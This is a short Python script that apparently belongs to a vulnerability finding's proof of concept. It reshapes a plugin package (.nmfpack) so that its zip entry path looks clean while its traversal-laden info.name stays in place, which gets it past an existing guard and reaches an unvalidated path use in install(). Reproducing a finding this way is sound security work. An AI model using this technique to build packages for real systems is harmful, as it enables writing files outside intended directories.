#!/usr/bin/env python3
"""Builds this finding's malicious .nmfpack from the Maven-built one.

`mvn -o package` in pwned-package/ (this directory's sibling) produces a
.nmfpack whose ZIP-internal file entry path is ALSO traversal-laden (it's
derived from the same info.name the plugin used) -- which the Supervisor's
existing, separate resolveInside() guard on zip entries blocks outright,
aborting install() before the actual vulnerability under test
(info.name's own, unvalidated use later in install()) is ever reached. See
README.md's "Important build note" for the full explanation.

This script rewrites just the zip entry's path (and the metadata line that
names it) to a clean, non-traversing path, leaving info.name itself
untouched -- the only package shape a real attacker could actually use.

Usage: run after `mvn -o package` in ../pwned-package/, from this directory:
    mkdir -p outside-target   # the Maven build's own destination needs to
                              # pre-exist -- see pwned-package/pom.xml's comment
    (cd pwned-package && mvn -o package)
    python3 build-fixture.py
"""
import zipfile

SRC = "outside-target/pwned-app-1.0.0.nmfpack"
DST = "outside-target/pwned-app-1.0.0-fixed.nmfpack"
CLEAN_JAR_PATH = "apps/pwned-app/pwned-package-fixture-1.0.0.jar"

zin = zipfile.ZipFile(SRC)
meta = zin.read("package-metadata.properties").decode()
jar_data = None
old_jar_name = None
for info in zin.infolist():
    if info.filename != "package-metadata.properties":
        old_jar_name = info.filename
        jar_data = zin.read(info.filename)

new_meta = meta.replace(old_jar_name, CLEAN_JAR_PATH)

with zipfile.ZipFile(DST, "w", zipfile.ZIP_DEFLATED) as zout:
    zout.writestr("package-metadata.properties", new_meta)
    zout.writestr(CLEAN_JAR_PATH, jar_data)

print(f"wrote {DST} (info.name still malicious; zip entry now clean: {CLEAN_JAR_PATH})")
